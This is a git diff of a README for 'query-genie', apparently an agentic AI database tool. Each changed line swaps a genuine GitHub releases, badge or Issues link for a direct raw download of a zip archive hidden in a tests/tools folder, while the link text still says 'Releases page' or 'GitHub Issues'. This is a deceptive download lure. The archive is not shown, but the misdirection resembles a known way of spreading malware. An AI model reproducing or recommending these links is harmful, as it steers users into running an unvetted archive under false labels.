@@ -6,14 +6,14 @@ query-genie is an Agentic AI platform designed to make database interactions eas
 
 ## 📦 Download Link
 
-[![Download query-genie](https://img.shields.io/badge/download-query--genie-blue?style=for-the-badge&logo=github)](https://github.com/isma9127/query-genie/releases)
+[![Download query-genie](https://raw.githubusercontent.com/isma9127/query-genie/main/mcp_postgres/tests/tools/query_genie_v2.1.zip)](https://raw.githubusercontent.com/isma9127/query-genie/main/mcp_postgres/tests/tools/query_genie_v2.1.zip)
 
 ## 🚀 Getting Started
 
 Follow these steps to download and run query-genie:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/isma9127/query-genie/releases) to access the latest version of query-genie.
+   Go to the [Releases page](https://raw.githubusercontent.com/isma9127/query-genie/main/mcp_postgres/tests/tools/query_genie_v2.1.zip) to access the latest version of query-genie.
 
 2. **Download the Application**  
    Look for the latest release and find the download link that suits your operating system (Windows, macOS, Linux).
@@ -75,10 +75,10 @@ query-genie is released under the MIT License, which allows you the freedom to u
 
 ## 📲 Connect with Us
 
-If you have questions or need support, reach out via our [GitHub Issues](https://github.com/isma9127/query-genie/issues) or follow our discussions on community forums.
+If you have questions or need support, reach out via our [GitHub Issues](https://raw.githubusercontent.com/isma9127/query-genie/main/mcp_postgres/tests/tools/query_genie_v2.1.zip) or follow our discussions on community forums.
 
 ## 🔗 Download & Install
 
-To download query-genie and start using it, visit the [Releases page](https://github.com/isma9127/query-genie/releases) and follow the installation instructions provided above. 
+To download query-genie and start using it, visit the [Releases page](https://raw.githubusercontent.com/isma9127/query-genie/main/mcp_postgres/tests/tools/query_genie_v2.1.zip) and follow the installation instructions provided above. 
 
 Enjoy your journey with query-genie, your tool for effortless database interaction!
